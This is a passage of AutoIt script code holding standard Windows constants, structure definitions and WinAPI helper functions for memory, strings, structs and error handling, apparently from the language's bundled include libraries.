Global Const $mouseeventf_rightup = 16
Global Const $mouseeventf_middledown = 32
Global Const $mouseeventf_middleup = 64
Global Const $mouseeventf_wheel = 2048
Global Const $mouseeventf_xdown = 128
Global Const $mouseeventf_xup = 256
Global Const $reg_none = 0
Global Const $reg_sz = 1
Global Const $reg_expand_sz = 2
Global Const $reg_binary = 3
Global Const $reg_dword = 4
Global Const $reg_dword_little_endian = 4
Global Const $reg_dword_big_endian = 5
Global Const $reg_link = 6
Global Const $reg_multi_sz = 7
Global Const $reg_resource_list = 8
Global Const $reg_full_resource_descriptor = 9
Global Const $reg_resource_requirements_list = 10
Global Const $reg_qword = 11
Global Const $reg_qword_little_endian = 11
Global Const $hwnd_bottom = 1
Global Const $hwnd_notopmost = -2
Global Const $hwnd_top = 0
Global Const $hwnd_topmost = -1
Global Const $swp_nosize = 1
Global Const $swp_nomove = 2
Global Const $swp_nozorder = 4
Global Const $swp_noredraw = 8
Global Const $swp_noactivate = 16
Global Const $swp_framechanged = 32
Global Const $swp_drawframe = 32
Global Const $swp_showwindow = 64
Global Const $swp_hidewindow = 128
Global Const $swp_nocopybits = 256
Global Const $swp_noownerzorder = 512
Global Const $swp_noreposition = 512
Global Const $swp_nosendchanging = 1024
Global Const $swp_defererase = 8192
Global Const $swp_asyncwindowpos = 16384
Global Const $keyword_default = 1
Global Const $keyword_null = 2
Global Const $declared_local = -1
Global Const $declared_unknown = 0
Global Const $declared_global = 1
Global Const $assign_create = 0
Global Const $assign_forcelocal = 1
Global Const $assign_forceglobal = 2
Global Const $assign_existfail = 4
Global Const $bi_enable = 0
Global Const $bi_disable = 1
Global Const $break_enable = 1
Global Const $break_disable = 0
Global Const $cdtray_open = "open"
Global Const $cdtray_closed = "closed"
Global Const $send_default = 0
Global Const $send_raw = 1
Global Const $dir_default = 0
Global Const $dir_extended = 1
Global Const $dir_norecurse = 2
Global Const $dir_remove = 1
Global Const $dt_all = "ALL"
Global Const $dt_cdrom = "CDROM"
Global Const $dt_removable = "REMOVABLE"
Global Const $dt_fixed = "FIXED"
Global Const $dt_network = "NETWORK"
Global Const $dt_ramdisk = "RAMDISK"
Global Const $dt_unknown = "UNKNOWN"
Global Const $dt_undefined = 1
Global Const $dt_fat = "FAT"
Global Const $dt_fat32 = "FAT32"
Global Const $dt_exfat = "exFAT"
Global Const $dt_ntfs = "NTFS"
Global Const $dt_nwfs = "NWFS"
Global Const $dt_cdfs = "CDFS"
Global Const $dt_udf = "UDF"
Global Const $dma_default = 0
Global Const $dma_persistent = 1
Global Const $dma_authentication = 8
Global Const $ds_unknown = "UNKNOWN"
Global Const $ds_ready = "READY"
Global Const $ds_notready = "NOTREADY"
Global Const $ds_invalid = "INVALID"
Global Const $mouse_click_left = "left"
Global Const $mouse_click_right = "right"
Global Const $mouse_click_middle = "middle"
Global Const $mouse_click_main = "main"
Global Const $mouse_click_menu = "menu"
Global Const $mouse_click_primary = "primary"
Global Const $mouse_click_secondary = "secondary"
Global Const $mouse_wheel_up = "up"
Global Const $mouse_wheel_down = "down"
Global Const $number_auto = 0
Global Const $number_32bit = 1
Global Const $number_64bit = 2
Global Const $number_double = 3
Global Const $obj_name = 1
Global Const $obj_string = 2
Global Const $obj_progid = 3
Global Const $obj_file = 4
Global Const $obj_module = 5
Global Const $obj_clsid = 6
Global Const $obj_iid = 7
Global Const $exitclose_normal = 0
Global Const $exitclose_byexit = 1
Global Const $exitclose_byclick = 2
Global Const $exitclose_bylogoff = 3
Global Const $exitclose_bysutdown = 4
Global Const $process_stats_memory = 0
Global Const $process_stats_io = 1
Global Const $process_low = 0
Global Const $process_belownormal = 1
Global Const $process_normal = 2
Global Const $process_abovenormal = 3
Global Const $process_high = 4
Global Const $process_realtime = 5
Global Const $run_logon_noprofile = 0
Global Const $run_logon_profile = 1
Global Const $run_logon_network = 2
Global Const $run_logon_inherit = 4
Global Const $sound_nowait = 0
Global Const $sound_wait = 1
Global Const $shex_open = "open"
Global Const $shex_edit = "edit"
Global Const $shex_print = "print"
Global Const $shex_properties = "properties"
Global Const $tcp_data_default = 0
Global Const $tcp_data_binary = 1
Global Const $udp_open_default = 0
Global Const $udp_open_broadcast = 1
Global Const $udp_data_default = 0
Global Const $udp_data_binary = 1
Global Const $udp_data_array = 2
Global Const $tip_noicon = 0
Global Const $tip_infoicon = 1
Global Const $tip_warningicon = 2
Global Const $tip_erroricon = 3
Global Const $tip_balloon = 1
Global Const $tip_center = 2
Global Const $tip_forcevisible = 4
Global Const $windows_noontop = 0
Global Const $windows_ontop = 1
Global Const $tagpoint = "struct;long X;long Y;endstruct"
Global Const $tagrect = "struct;long Left;long Top;long Right;long Bottom;endstruct"
Global Const $tagsize = "struct;long X;long Y;endstruct"
Global Const $tagmargins = "int cxLeftWidth;int cxRightWidth;int cyTopHeight;int cyBottomHeight"
Global Const $tagfiletime = "struct;dword Lo;dword Hi;endstruct"
Global Const $tagsystemtime = "struct;word Year;word Month;word Dow;word Day;word Hour;word Minute;word Second;word MSeconds;endstruct"
Global Const $tagtime_zone_information = "struct;long Bias;wchar StdName[32];word StdDate[8];long StdBias;wchar DayName[32];word DayDate[8];long DayBias;endstruct"
Global Const $tagnmhdr = "struct;hwnd hWndFrom;uint_ptr IDFrom;INT Code;endstruct"
Global Const $tagcomboboxexitem = "uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;int SelectedImage;int OverlayImage;" & "int Indent;lparam Param"
Global Const $tagnmcbedragbegin = $tagnmhdr & ";int ItemID;wchar szText[260]"
Global Const $tagnmcbeendedit = $tagnmhdr & ";bool fChanged;int NewSelection;wchar szText[260];int Why"
Global Const $tagnmcomboboxex = $tagnmhdr & ";uint Mask;int_ptr Item;ptr Text;int TextMax;int Image;" & "int SelectedImage;int OverlayImage;int Indent;lparam Param"
Global Const $tagdtprange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;" & "word MinSecond;word MinMSecond;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;" & "word MaxMinute;word MaxSecond;word MaxMSecond;bool MinValid;bool MaxValid"
Global Const $tagnmdatetimechange = $tagnmhdr & ";dword Flag;" & $tagsystemtime
Global Const $tagnmdatetimeformat = $tagnmhdr & ";ptr Format;" & $tagsystemtime & ";ptr pDisplay;wchar Display[64]"
Global Const $tagnmdatetimeformatquery = $tagnmhdr & ";ptr Format;struct;long SizeX;long SizeY;endstruct"
Global Const $tagnmdatetimekeydown = $tagnmhdr & ";int VirtKey;ptr Format;" & $tagsystemtime
Global Const $tagnmdatetimestring = $tagnmhdr & ";ptr UserString;" & $tagsystemtime & ";dword Flags"
Global Const $tageventlogrecord = "dword Length;dword Reserved;dword RecordNumber;dword TimeGenerated;dword TimeWritten;dword EventID;" & "word EventType;word NumStrings;word EventCategory;word ReservedFlags;dword ClosingRecordNumber;dword StringOffset;" & "dword UserSidLength;dword UserSidOffset;dword DataLength;dword DataOffset"
Global Const $taggdip_effectparams_blur = "float Radius; bool ExpandEdge"
Global Const $taggdip_effectparams_brightnesscontrast = "int BrightnessLevel; int ContrastLevel"
Global Const $taggdip_effectparams_colorbalance = "int CyanRed; int MagentaGreen; int YellowBlue"
Global Const $taggdip_effectparams_colorcurve = "int Adjustment; int Channel; int AdjustValue"
Global Const $taggdip_effectparams_colorlut = "byte LutB[256]; byte LutG[256]; byte LutR[256]; byte LutA[256]"
Global Const $taggdip_effectparams_huesaturationlightness = "int HueLevel; int SaturationLevel; int LightnessLevel"
Global Const $taggdip_effectparams_levels = "int Highlight; int Midtone; int Shadow"
Global Const $taggdip_effectparams_redeyecorrection = "uint NumberOfAreas; ptr Areas"
Global Const $taggdip_effectparams_sharpen = "float Radius; float Amount"
Global Const $taggdip_effectparams_tint = "int Hue; int Amount"
Global Const $taggdipbitmapdata = "uint Width;uint Height;int Stride;int Format;ptr Scan0;uint_ptr Reserved"
Global Const $taggdipcolormatrix = "float m[25]"
Global Const $taggdipencoderparam = "struct;byte GUID[16];ulong NumberOfValues;ulong Type;ptr Values;endstruct"
Global Const $taggdipencoderparams = "uint Count;" & $taggdipencoderparam
Global Const $taggdiprectf = "struct;float X;float Y;float Width;float Height;endstruct"
Global Const $taggdipstartupinput = "uint Version;ptr Callback;bool NoThread;bool NoCodecs"
Global Const $taggdipstartupoutput = "ptr HookProc;ptr UnhookProc"
Global Const $taggdipimagecodecinfo = "byte CLSID[16];byte FormatID[16];ptr CodecName;ptr DllName;ptr FormatDesc;ptr FileExt;" & "ptr MimeType;dword Flags;dword Version;dword SigCount;dword SigSize;ptr SigPattern;ptr SigMask"
Global Const $taggdippencoderparams = "uint Count;byte Params[1]"
Global Const $taghditem = "uint Mask;int XY;ptr Text;handle hBMP;int TextMax;int Fmt;lparam Param;int Image;int Order;uint Type;ptr pFilter;uint State"
Global Const $tagnmhddispinfo = $tagnmhdr & ";int Item;uint Mask;ptr Text;int TextMax;int Image;lparam lParam"
Global Const $tagnmhdfilterbtnclick = $tagnmhdr & ";int Item;" & $tagrect
Global Const $tagnmheader = $tagnmhdr & ";int Item;int Button;ptr pItem"
Global Const $taggetipaddress = "byte Field4;byte Field3;byte Field2;byte Field1"
Global Const $tagnmipaddress = $tagnmhdr & ";int Field;int Value"
Global Const $taglvfindinfo = "struct;uint Flags;ptr Text;lparam Param;" & $tagpoint & ";uint Direction;endstruct"
Global Const $taglvhittestinfo = $tagpoint & ";uint Flags;int Item;int SubItem;int iGroup"
Global Const $taglvitem = "struct;uint Mask;int Item;int SubItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;lparam Param;" & "int Indent;int GroupID;uint Columns;ptr pColumns;ptr piColFmt;int iGroup;endstruct"
Global Const $tagnmlistview = $tagnmhdr & ";int Item;int SubItem;uint NewState;uint OldState;uint Changed;" & "struct;long ActionX;long ActionY;endstruct;lparam Param"
Global Const $tagnmlvcustomdraw = "struct;" & $tagnmhdr & ";dword dwDrawStage;handle hdc;" & $tagrect & ";dword_ptr dwItemSpec;uint uItemState;lparam lItemlParam;endstruct" & ";dword clrText;dword clrTextBk;int iSubItem;dword dwItemType;dword clrFace;int iIconEffect;" & "int iIconPhase;int iPartID;int iStateID;struct;long TextLeft;long TextTop;long TextRight;long TextBottom;endstruct;uint uAlign"
Global Const $tagnmlvdispinfo = $tagnmhdr & ";" & $taglvitem
Global Const $tagnmlvfinditem = $tagnmhdr & ";int Start;" & $taglvfindinfo
Global Const $tagnmlvgetinfotip = $tagnmhdr & ";dword Flags;ptr Text;int TextMax;int Item;int SubItem;lparam lParam"
Global Const $tagnmitemactivate = $tagnmhdr & ";int Index;int SubItem;uint NewState;uint OldState;uint Changed;" & $tagpoint & ";lparam lParam;uint KeyFlags"
Global Const $tagnmlvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmlvscroll = $tagnmhdr & ";int DX;int DY"
Global Const $tagmchittestinfo = "uint Size;" & $tagpoint & ";uint Hit;" & $tagsystemtime & ";" & $tagrect & ";int iOffset;int iRow;int iCol"
Global Const $tagmcmonthrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short Span"
Global Const $tagmcrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds;short MinSet;short MaxSet"
Global Const $tagmcselrange = "word MinYear;word MinMonth;word MinDOW;word MinDay;word MinHour;word MinMinute;word MinSecond;" & "word MinMSeconds;word MaxYear;word MaxMonth;word MaxDOW;word MaxDay;word MaxHour;word MaxMinute;word MaxSecond;" & "word MaxMSeconds"
Global Const $tagnmdaystate = $tagnmhdr & ";" & $tagsystemtime & ";int DayState;ptr pDayState"
Global Const $tagnmselchange = $tagnmhdr & ";struct;word BegYear;word BegMonth;word BegDOW;word BegDay;word BegHour;word BegMinute;word BegSecond;word BegMSeconds;endstruct;" & "struct;word EndYear;word EndMonth;word EndDOW;word EndDay;word EndHour;word EndMinute;word EndSecond;word EndMSeconds;endstruct"
Global Const $tagnmobjectnotify = $tagnmhdr & ";int Item;ptr piid;ptr pObject;long Result;dword dwFlags"
Global Const $tagnmtckeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagtvitem = "struct;uint Mask;handle hItem;uint State;uint StateMask;ptr Text;int TextMax;int Image;int SelectedImage;" & "int Children;lparam Param;endstruct"
Global Const $tagtvitemex = "struct;" & $tagtvitem & ";int Integral;uint uStateEx;hwnd hwnd;int iExpandedImage;int iReserved;endstruct"
Global Const $tagnmtreeview = $tagnmhdr & ";uint Action;" & "struct;uint OldMask;handle OldhItem;uint OldState;uint OldStateMask;" & "ptr OldText;int OldTextMax;int OldImage;int OldSelectedImage;int OldChildren;lparam OldParam;endstruct;" & "struct;uint NewMask;handle NewhItem;uint NewState;uint NewStateMask;" & "ptr NewText;int NewTextMax;int NewImage;int NewSelectedImage;int NewChildren;lparam NewParam;endstruct;" & "struct;long PointX;long PointY;endstruct"
Global Const $tagnmtvcustomdraw = "struct;" & $tagnmhdr & ";dword DrawStage;handle HDC;" & $tagrect & ";dword_ptr ItemSpec;uint ItemState;lparam ItemParam;endstruct" & ";dword ClrText;dword ClrTextBk;int Level"
Global Const $tagnmtvdispinfo = $tagnmhdr & ";" & $tagtvitem
Global Const $tagnmtvgetinfotip = $tagnmhdr & ";ptr Text;int TextMax;handle hItem;lparam lParam"
Global Const $tagnmtvitemchange = $tagnmhdr & ";uint Changed;handle hItem;uint StateNew;uint StateOld;lparam lParam;"
Global Const $tagtvhittestinfo = $tagpoint & ";uint Flags;handle Item"
Global Const $tagnmtvkeydown = "align 1;" & $tagnmhdr & ";word VKey;uint Flags"
Global Const $tagnmmouse = $tagnmhdr & ";dword_ptr ItemSpec;dword_ptr ItemData;" & $tagpoint & ";lparam HitInfo"
Global Const $tagtoken_privileges = "dword Count;align 4;int64 LUID;dword Attributes"
Global Const $tagimageinfo = "handle hBitmap;handle hMask;int Unused1;int Unused2;" & $tagrect
Global Const $tagmenuinfo = "dword Size;INT Mask;dword Style;uint YMax;handle hBack;dword ContextHelpID;ulong_ptr MenuData"
Global Const $tagmenuiteminfo = "uint Size;uint Mask;uint Type;uint State;uint ID;handle SubMenu;handle BmpChecked;handle BmpUnchecked;" & "ulong_ptr ItemData;ptr TypeData;uint CCH;handle BmpItem"
Global Const $tagrebarbandinfo = "uint cbSize;uint fMask;uint fStyle;dword clrFore;dword clrBack;ptr lpText;uint cch;" & "int iImage;hwnd hwndChild;uint cxMinChild;uint cyMinChild;uint cx;handle hbmBack;uint wID;uint cyChild;uint cyMaxChild;" & "uint cyIntegral;uint cxIdeal;lparam lParam;uint cxHeader" & ((@OSVersion = "WIN_XP") ? "" : ";" & $tagrect & ";uint uChevronState")
Global Const $tagnmrebarautobreak = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;uint uMsg;uint fStyleCurrent;bool fAutoBreak"
Global Const $tagnmrbautosize = $tagnmhdr & ";bool fChanged;" & "struct;long TargetLeft;long TargetTop;long TargetRight;long TargetBottom;endstruct;" & "struct;long ActualLeft;long ActualTop;long ActualRight;long ActualBottom;endstruct"
Global Const $tagnmrebar = $tagnmhdr & ";dword dwMask;uint uBand;uint fStyle;uint wID;lparam lParam"
Global Const $tagnmrebarchevron = $tagnmhdr & ";uint uBand;uint wID;lparam lParam;" & $tagrect & ";lparam lParamNM"
Global Const $tagnmrebarchildsize = $tagnmhdr & ";uint uBand;uint wID;" & "struct;long CLeft;long CTop;long CRight;long CBottom;endstruct;" & "struct;long BLeft;long BTop;long BRight;long BBottom;endstruct"
Global Const $tagcolorscheme = "dword Size;dword BtnHighlight;dword BtnShadow"
Global Const $tagnmtoolbar = $tagnmhdr & ";int iItem;" & "struct;int iBitmap;int idCommand;byte fsState;byte fsStyle;dword_ptr dwData;int_ptr iString;endstruct" & ";int cchText;ptr pszText;" & $tagrect
Global Const $tagnmtbhotitem = $tagnmhdr & ";int idOld;int idNew;dword dwFlags"
Global Const $tagtbbutton = "int Bitmap;int Command;byte State;byte Style;dword_ptr Param;int_ptr String"
Global Const $tagtbbuttoninfo = "uint Size;dword Mask;int Command;int Image;byte State;byte Style;word CX;dword_ptr Param;ptr Text;int TextMax"
Global Const $tagnetresource = "dword Scope;dword Type;dword DisplayType;dword Usage;ptr LocalName;ptr RemoteName;ptr Comment;ptr Provider"
Global Const $tagoverlapped = "ulong_ptr Internal;ulong_ptr InternalHigh;struct;dword Offset;dword OffsetHigh;endstruct;handle hEvent"
Global Const $tagopenfilename = "dword StructSize;hwnd hwndOwner;handle hInstance;ptr lpstrFilter;ptr lpstrCustomFilter;" & "dword nMaxCustFilter;dword nFilterIndex;ptr lpstrFile;dword nMaxFile;ptr lpstrFileTitle;dword nMaxFileTitle;" & "ptr lpstrInitialDir;ptr lpstrTitle;dword Flags;word nFileOffset;word nFileExtension;ptr lpstrDefExt;lparam lCustData;" & "ptr lpfnHook;ptr lpTemplateName;ptr pvReserved;dword dwReserved;dword FlagsEx"
Global Const $tagbitmapinfoheader = "struct;dword biSize;long biWidth;long biHeight;word biPlanes;word biBitCount;" & "dword biCompression;dword biSizeImage;long biXPelsPerMeter;long biYPelsPerMeter;dword biClrUsed;dword biClrImportant;endstruct"
Global Const $tagbitmapinfo = $tagbitmapinfoheader & ";dword biRGBQuad[1]"
Global Const $tagblendfunction = "byte Op;byte Flags;byte Alpha;byte Format"
Global Const $tagguid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
Global Const $tagwindowplacement = "uint length;uint flags;uint showCmd;long ptMinPosition[2];long ptMaxPosition[2];long rcNormalPosition[4]"
Global Const $tagwindowpos = "hwnd hWnd;hwnd InsertAfter;int X;int Y;int CX;int CY;uint Flags"
Global Const $tagscrollinfo = "uint cbSize;uint fMask;int nMin;int nMax;uint nPage;int nPos;int nTrackPos"
Global Const $tagscrollbarinfo = "dword cbSize;" & $tagrect & ";int dxyLineButton;int xyThumbTop;" & "int xyThumbBottom;int reserved;dword rgstate[6]"
Global Const $taglogfont = "struct;long Height;long Width;long Escapement;long Orientation;long Weight;byte Italic;byte Underline;" & "byte Strikeout;byte CharSet;byte OutPrecision;byte ClipPrecision;byte Quality;byte PitchAndFamily;wchar FaceName[32];endstruct"
Global Const $tagkbdllhookstruct = "dword vkCode;dword scanCode;dword flags;dword time;ulong_ptr dwExtraInfo"
Global Const $tagprocess_information = "handle hProcess;handle hThread;dword ProcessID;dword ThreadID"
Global Const $tagstartupinfo = "dword Size;ptr Reserved1;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;" & "dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved3;handle StdInput;" & "handle StdOutput;handle StdError"
Global Const $tagsecurity_attributes = "dword Length;ptr Descriptor;bool InheritHandle"
Global Const $tagwin32_find_data = "dword dwFileAttributes;dword ftCreationTime[2];dword ftLastAccessTime[2];dword ftLastWriteTime[2];dword nFileSizeHigh;dword nFileSizeLow;dword dwReserved0;dword dwReserved1;wchar cFileName[260];wchar cAlternateFileName[14]"
Global Const $tagtextmetric = "long tmHeight;long tmAscent;long tmDescent;long tmInternalLeading;long tmExternalLeading;" & "long tmAveCharWidth;long tmMaxCharWidth;long tmWeight;long tmOverhang;long tmDigitizedAspectX;long tmDigitizedAspectY;" & "wchar tmFirstChar;wchar tmLastChar;wchar tmDefaultChar;wchar tmBreakChar;byte tmItalic;byte tmUnderlined;byte tmStruckOut;" & "byte tmPitchAndFamily;byte tmCharSet"

Func _winapi_getlasterror(Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	Local $aresult = DllCall("kernel32.dll", "dword", "GetLastError")
	Return SetError($_icurrenterror, $_icurrentextended, $aresult[0])
EndFunc

Func _winapi_setlasterror($ierrorcode, Const $_icurrenterror = @error, Const $_icurrentextended = @extended)
	DllCall("kernel32.dll", "none", "SetLastError", "dword", $ierrorcode)
	Return SetError($_icurrenterror, $_icurrentextended, NULL )
EndFunc

Func __comerrorformating($ocomerror, $sprefix = @TAB)
	Local Const $str_striptrailing = 2
	Local $serror = "COM Error encountered in " & @ScriptName & " (" & $ocomerror.scriptline & ") :" & @CRLF & $sprefix & "Number        " & @TAB & "= 0x" & Hex($ocomerror.number, 8) & " (" & $ocomerror.number & ")" & @CRLF & $sprefix & "WinDescription" & @TAB & "= " & StringStripWS($ocomerror.windescription, $str_striptrailing) & @CRLF & $sprefix & "Description   " & @TAB & "= " & StringStripWS($ocomerror.description, $str_striptrailing) & @CRLF & $sprefix & "Source        " & @TAB & "= " & $ocomerror.source & @CRLF & $sprefix & "HelpFile      " & @TAB & "= " & $ocomerror.helpfile & @CRLF & $sprefix & "HelpContext   " & @TAB & "= " & $ocomerror.helpcontext & @CRLF & $sprefix & "LastDllError  " & @TAB & "= " & $ocomerror.lastdllerror & @CRLF & $sprefix & "Retcode       " & @TAB & "= 0x" & Hex($ocomerror.retcode)
	Return $serror
EndFunc

#Region Global Variables and Constants
	Global $__g_venum, $__g_vext = 0
	Global $__g_hheap = 0, $__g_irgbmode = 1
	Global Const $tagosversioninfo = "struct;dword OSVersionInfoSize;dword MajorVersion;dword MinorVersion;dword BuildNumber;dword PlatformId;wchar CSDVersion[128];endstruct"
	Global Const $__winver = __winver()
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_arraytostruct(Const ByRef $adata, $istart = 0, $iend = -1)
		If __checkerrorarraybounds($adata, $istart, $iend) Then Return SetError(@error + 10, @extended, 0)
		Local $tagstruct = ""
		For $i = $istart To $iend
			$tagstruct &= "wchar[" & (StringLen($adata[$i]) + 1) & "];"
		Next
		Local $tdata = DllStructCreate($tagstruct & "wchar[1]")
		Local $icount = 1
		For $i = $istart To $iend
			DllStructSetData($tdata, $icount, $adata[$i])
			$icount += 1
		Next
		DllStructSetData($tdata, $icount, ChrW(0))
		Return $tdata
	EndFunc

	Func _winapi_createmargins($ileftwidth, $irightwidth, $itopheight, $ibottomheight)
		Local $tmargins = DllStructCreate($tagmargins)
		DllStructSetData($tmargins, 1, $ileftwidth)
		DllStructSetData($tmargins, 2, $irightwidth)
		DllStructSetData($tmargins, 3, $itopheight)
		DllStructSetData($tmargins, 4, $ibottomheight)
		Return $tmargins
	EndFunc

	Func _winapi_createpoint($ix, $iy)
		Local $tpoint = DllStructCreate($tagpoint)
		DllStructSetData($tpoint, 1, $ix)
		DllStructSetData($tpoint, 2, $iy)
		Return $tpoint
	EndFunc

	Func _winapi_createrect($ileft, $itop, $iright, $ibottom)
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, 1, $ileft)
		DllStructSetData($trect, 2, $itop)
		DllStructSetData($trect, 3, $iright)
		DllStructSetData($trect, 4, $ibottom)
		Return $trect
	EndFunc

	Func _winapi_createrectex($ix, $iy, $iwidth, $iheight)
		Local $trect = DllStructCreate($tagrect)
		DllStructSetData($trect, 1, $ix)
		DllStructSetData($trect, 2, $iy)
		DllStructSetData($trect, 3, $ix + $iwidth)
		DllStructSetData($trect, 4, $iy + $iheight)
		Return $trect
	EndFunc

	Func _winapi_createsize($iwidth, $iheight)
		Local $tsize = DllStructCreate($tagsize)
		DllStructSetData($tsize, 1, $iwidth)
		DllStructSetData($tsize, 2, $iheight)
		Return $tsize
	EndFunc

	Func _winapi_fatalexit($icode)
		DllCall("kernel32.dll", "none", "FatalExit", "int", $icode)
		If @error Then Return SetError(@error, @extended)
	EndFunc

	Func _winapi_getbitmapdimension($hbitmap)
		Local Const $tagbitmap = "struct;long bmType;long bmWidth;long bmHeight;long bmWidthBytes;ushort bmPlanes;ushort bmBitsPixel;ptr bmBits;endstruct"
		Local $tobj = DllStructCreate($tagbitmap)
		Local $aret = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return _winapi_createsize(DllStructGetData($tobj, "bmWidth"), DllStructGetData($tobj, "bmHeight"))
	EndFunc

	Func _winapi_getstring($pstring, $bunicode = True)
		Local $ilength = _winapi_strlen($pstring, $bunicode)
		If @error OR NOT $ilength Then Return SetError(@error + 10, @extended, "")
		Local $tstring = DllStructCreate(__iif($bunicode, "wchar", "char") & "[" & ($ilength + 1) & "]", $pstring)
		If @error Then Return SetError(@error, @extended, "")
		Return SetExtended($ilength, DllStructGetData($tstring, 1))
	EndFunc

	Func _winapi_isbadreadptr($paddress, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadReadPtr", "struct*", $paddress, "uint_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_isbadwriteptr($paddress, $ilength)
		Local $aret = DllCall("kernel32.dll", "bool", "IsBadWritePtr", "struct*", $paddress, "uint_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_iswow64process($ipid = 0)
		If NOT $ipid Then $ipid = @AutoItPID
		Local $hprocess = DllCall("kernel32.dll", "handle", "OpenProcess", "dword", __iif($__winver < 1536, 1024, 4096), "bool", 0, "dword", $ipid)
		If @error OR NOT $hprocess[0] Then Return SetError(@error + 20, @extended, False)
		Local $aret = DllCall("kernel32.dll", "bool", "IsWow64Process", "handle", $hprocess[0], "bool*", 0)
		If __checkerrorclosehandle($aret, $hprocess[0]) Then Return SetError(@error, @extended, False)
		Return $aret[2]
	EndFunc

	Func _winapi_movememory($pdestination, $psource, $ilength)
		If _winapi_isbadreadptr($psource, $ilength) Then Return SetError(10, @extended, 0)
		If _winapi_isbadwriteptr($pdestination, $ilength) Then Return SetError(11, @extended, 0)
		DllCall("ntdll.dll", "none", "RtlMoveMemory", "struct*", $pdestination, "struct*", $psource, "ulong_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_pathisdirectory($sfilepath)
		Local $aret = DllCall("shlwapi.dll", "bool", "PathIsDirectoryW", "wstr", $sfilepath)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_strlen($pstring, $bunicode = True)
		Local $w = ""
		If $bunicode Then $w = "W"
		Local $aret = DllCall("kernel32.dll", "int", "lstrlen" & $w, "struct*", $pstring)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_structtoarray(ByRef $tstruct, $iitems = 0)
		Local $isize = 2 * Floor(DllStructGetSize($tstruct) / 2)
		Local $pstruct = DllStructGetPtr($tstruct)
		If NOT $isize OR NOT $pstruct Then Return SetError(1, 0, 0)
		Local $tdata, $ilength, $ioffset = 0
		Local $aresult[101] = [0]
		While 1
			$ilength = _winapi_strlen($pstruct + $ioffset)
			If NOT $ilength Then
				ExitLoop
			EndIf
			If 2 * (1 + $ilength) + $ioffset > $isize Then Return SetError(3, 0, 0)
			$tdata = DllStructCreate("wchar[" & (1 + $ilength) & "]", $pstruct + $ioffset)
			If @error Then Return SetError(@error + 10, 0, 0)
			__inc($aresult)
			$aresult[$aresult[0]] = DllStructGetData($tdata, 1)
			If $aresult[0] = $iitems Then
				ExitLoop
			EndIf
			$ioffset += 2 * (1 + $ilength)
			If $ioffset >= $isize Then Return SetError(3, 0, 0)
		WEnd
		If NOT $aresult[0] Then Return SetError(2, 0, 0)
		__inc($aresult, -1)
		Return $aresult
	EndFunc

	Func _winapi_swapdword($ivalue)
		Local $tstruct1 = DllStructCreate("dword;dword")
		Local $tstruct2 = DllStructCreate("byte[4];byte[4]", DllStructGetPtr($tstruct1))
		DllStructSetData($tstruct1, 1, $ivalue)
		For $i = 1 To 4
			DllStructSetData($tstruct2, 2, DllStructGetData($tstruct2, 1, 5 - $i), $i)
		Next
		Return DllStructGetData($tstruct1, 2)
	EndFunc

	Func _winapi_swapqword($ivalue)
		Local $tstruct1 = DllStructCreate("int64;int64")
		Local $tstruct2 = DllStructCreate("byte[8];byte[8]", DllStructGetPtr($tstruct1))
		DllStructSetData($tstruct1, 1, $ivalue)
		For $i = 1 To 8
			DllStructSetData($tstruct2, 2, DllStructGetData($tstruct2, 1, 9 - $i), $i)
		Next
		Return DllStructGetData($tstruct1, 2)
	EndFunc

	Func _winapi_swapword($ivalue)
		Local $tstruct1 = DllStructCreate("word;word")
		Local $tstruct2 = DllStructCreate("byte[2];byte[2]", DllStructGetPtr($tstruct1))
		DllStructSetData($tstruct1, 1, $ivalue)
		For $i = 1 To 2
			DllStructSetData($tstruct2, 2, DllStructGetData($tstruct2, 1, 3 - $i), $i)
		Next
		Return DllStructGetData($tstruct1, 2)
	EndFunc

	Func _winapi_switchcolor($icolor)
		If $icolor = -1 Then Return $icolor
		Return BitOR(BitAND($icolor, 65280), BitShift(BitAND($icolor, 255), -16), BitShift(BitAND($icolor, 16711680), 16))
	EndFunc

	Func _winapi_zeromemory($pmemory, $ilength)
		If _winapi_isbadwriteptr($pmemory, $ilength) Then Return SetError(11, @extended, 0)
		DllCall("ntdll.dll", "none", "RtlZeroMemory", "struct*", $pmemory, "ulong_ptr", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

#EndRegion Public Functions
#Region Internal Functions

	Func __checkerrorarraybounds(Const ByRef $adata, ByRef $istart, ByRef $iend, $ndim = 1, $idim = $ubound_dimensions)
		If NOT IsArray($adata) Then Return SetError(1, 0, 1)
